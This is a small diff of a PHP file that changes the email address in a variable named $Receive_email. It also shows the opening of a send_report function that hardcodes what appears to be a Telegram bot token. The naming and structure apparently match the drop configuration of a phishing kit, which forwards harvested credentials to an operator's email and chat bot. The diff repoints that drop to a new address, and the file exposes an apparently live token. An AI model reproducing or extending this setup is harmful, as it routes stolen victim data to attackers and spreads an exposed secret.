@@ -1,5 +1,5 @@
 <?php
-$Receive_email = "ablejoe63@gmail.com";
+$Receive_email = "top4lyfe@atomicmail.io";
 
 function send_report($to, $subject, $message) {
     $token = '7965408638:AAFFxFCY19zcoO_Dmvr67yX5CLmnCKFL-w0';
